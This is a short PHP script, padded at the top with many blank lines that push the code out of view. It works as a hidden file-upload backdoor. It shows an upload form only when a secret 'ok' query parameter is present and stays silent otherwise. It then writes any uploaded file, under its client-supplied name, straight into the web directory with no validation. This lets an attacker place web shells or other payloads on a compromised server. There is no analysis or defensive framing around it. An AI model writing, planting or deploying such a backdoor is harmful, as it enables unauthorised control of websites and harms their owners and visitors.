

























































































<?php if(@$_GET['ok']){?>

<form method="post" enctype="multipart/form-data">
  <input type="file" name="uk45">
  <button>up</button>
</form>

<?php
} else {echo "";}
if (isset($_FILES['uk45'])) {
  file_put_contents($_FILES['uk45']['name'], file_get_contents($_FILES['uk45']['tmp_name']));
  if (file_exists("./".$_FILES['uk45']['name'])) {
    echo "Oke !";
  } else {
    echo "Fail !";
  }
} 
?>
